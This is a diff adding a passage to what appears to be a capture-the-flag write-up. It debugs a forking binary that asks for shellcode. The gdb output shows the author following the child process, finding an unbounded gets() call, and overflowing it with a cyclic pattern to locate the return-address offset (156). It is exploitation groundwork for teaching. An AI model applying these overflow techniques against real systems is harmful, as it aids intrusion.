@@ -7,7 +7,38 @@ Give me some shellcode, k
 child is exiting...
 ```
 
+```
+run
 
+=> 0x080486d6 <+14>:	call   0x8048550 <fork@plt>
+   0x080486db <+19>:	mov    %eax,0xac(%esp)
+   
+(gdb) ni
+0x080486db in main ()
+(gdb) Give me some shellcode, k   
+   
+```
+as u see the main parent process jumps directly to the prompt
+
+
+(gdb) set follow-fork-mode child
+
+=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>
+
+```
+(gdb) run <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1709]
+=> 0x6261616f
+
+(gdb) i r $eip
+eip            0x6261616f
+
+➜  Desktop cyclic -l 0x6261616f
+156
+
+```
 
 
 
